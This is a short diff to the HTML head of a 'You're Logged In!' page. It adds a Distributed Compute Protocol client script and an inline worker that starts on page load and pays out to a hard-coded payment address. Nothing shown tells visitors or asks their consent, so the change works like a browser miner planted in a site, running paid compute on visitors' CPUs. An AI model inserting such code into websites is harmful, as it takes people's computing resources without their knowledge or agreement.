@@ -4,6 +4,16 @@
     <meta charset="utf-8">
     <title>You're Logged In!</title>
     <link rel="stylesheet" href="/css/homepage.css"/>
+    //this is the DCL add-on
+    <script src="https://scheduler.distributed.computer/dcp-client/dcp-client.js"></script>
+
+      <script>
+        const worker = new dcp.worker.Worker({
+          paymentAddress: "0x9E92124DFdA6c4Db7981aB9d07ce72A75EF20AE9",
+          maxWorkingSandboxes: 2,
+        });
+        worker.start();
+           </script>
   </head>
   <body>
     <div class="uppernav">
